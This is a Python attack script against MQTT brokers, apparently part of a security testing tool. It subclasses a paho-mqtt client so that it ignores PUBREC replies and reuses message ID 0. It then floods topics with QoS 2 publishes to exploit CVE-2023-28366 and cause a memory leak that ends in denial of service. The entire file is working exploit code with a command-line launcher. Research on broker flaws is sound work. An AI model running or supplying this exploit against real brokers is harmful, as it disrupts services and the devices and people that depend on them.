import random
import paho.mqtt.client as mqtt
import argparse
import mqtt_utilities as util
import time


class PoisonedClient1(mqtt.Client):
    """Python class implementing a poisoned MQTT client to implement the attack"""

    def _handle_pubrec(self) -> mqtt.MQTTErrorCode:
        print(f"Ignoring PUBREC messages")

    def _mid_generate(self) -> int:
        return 0


def main(username, password, duration=10.0, number=100):
    """In Quality of Service 2 and duplicate Message ID attack we exploit CVE-2023-28366 and send many messages with the described properties without responding to PUBREC commands to cause a memory leak"""""
    client_p = PoisonedClient1(mqtt.CallbackAPIVersion.VERSION2, protocol=mqtt.MQTTv311)
    client_p.username_pw_set(username, password)
    client_p.on_connect = util.on_connect
    client_p.on_disconnect = util.on_disconnect
    client_p.on_publish = util.on_publish
    topics = util.get_accessible_topics(username)
    interval = float(duration) / number

    if util.connect_client(client_p):
        for i in range(number):
            client_p.publish(random.choice(topics), "whatever", qos=2)
            time.sleep(interval * random.random() * 2)
        print("Time elapsed, execution is terminating...", flush=True)
        client_p.disconnect()
    else:
        print(f"Broker not reachable, ending script...", flush=True)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="launch an qos_mid_dos attack from the local machine")
    parser.add_argument("-d", "--duration", type=float, help="duration in seconds")
    parser.add_argument("-u", "--username", type=str, help="username to connect as")
    parser.add_argument("-p", "--password", type=str, help="password to connect with")
    parser.add_argument("-n", "--number", type=int, help="number of messages to send")
    args = parser.parse_args()
    main(args.username, args.password, args.duration, args.number)
